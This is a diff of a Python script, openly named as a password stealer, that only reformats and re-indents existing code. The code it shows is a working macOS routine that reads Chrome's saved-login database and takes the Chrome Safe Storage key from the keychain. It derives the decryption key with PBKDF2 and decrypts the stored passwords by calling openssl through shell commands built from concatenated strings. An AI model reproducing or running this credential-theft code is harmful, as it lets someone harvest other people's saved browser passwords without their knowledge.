@@ -34,7 +34,7 @@ def steal():
 		return steal_windows()
 	elif platform.system()=='Darwin':
 		return steal_osx()
-	return("[-] "+platform.system()+"is not supported.")
+	return("[-] "+platform.system()+" is not supported.")
 # OSX part
 def steal_osx():
 	# Recovered list
@@ -42,12 +42,11 @@ def steal_osx():
 	# Get the passwords
 	data = query_db(os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data'))
 	# Get the encrpytion key from the keychain
-	safe_storage_key = subprocess.Popen(
-		"security find-generic-password -wa "
-		"'Chrome'",
-		stdout=subprocess.PIPE,
-		stderr=subprocess.PIPE,
-		shell=True)
+	safe_storage_key = subprocess.Popen("security find-generic-password -wa "
+					    "'Chrome'",
+				            stdout=subprocess.PIPE,
+					    stderr=subprocess.PIPE,
+					    shell=True)
 	stdout, stderr = safe_storage_key.communicate()
 	safe_storage_key = stdout.replace("\n", "")
 	# Catch keychain errors
@@ -59,26 +58,22 @@ def steal_osx():
 	if len(data) > 0:
 		# Loop through the passwords
 		for result in data:
-	  		#Setup the initialisation vector
-	  		iv = ''.join(('20', ) * 16)
-
+			#Setup the initialisation vector
+			iv = ''.join(('20', ) * 16)
 			# Setup the decryption key
 			key = pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]
 			hex_key = binascii.hexlify(key)
-
 			# Decrpyt the password with the key
 			hex_enc_password = base64.b64encode(result[2][3:])
-
 			# Send any error messages to /dev/null to prevent screen bloating up
 			# (any decryption errors will give a non-zero exit, causing exception)
 			try:
 				if hex_enc_password:
 					# Decrpyt with OpenSSL
-					password = subprocess.check_output(
-						"openssl enc -base64 -d "
-						"-aes-128-cbc -iv '"+iv+"' -K "+hex_key+" <<< "+
-						hex_enc_password+" 2>/dev/null",
-						shell=True)
+					password = subprocess.check_output("openssl enc -base64 -d "
+									   "-aes-128-cbc -iv '"+iv+"' -K "+hex_key+" <<< "+
+									   hex_enc_password+" 2>/dev/null",
+									   shell=True)
 					# If the URL is blank,print it as (Unknown)
 					if(len(result[0]) <= 0):
 						result[0] = "(Unknown)"
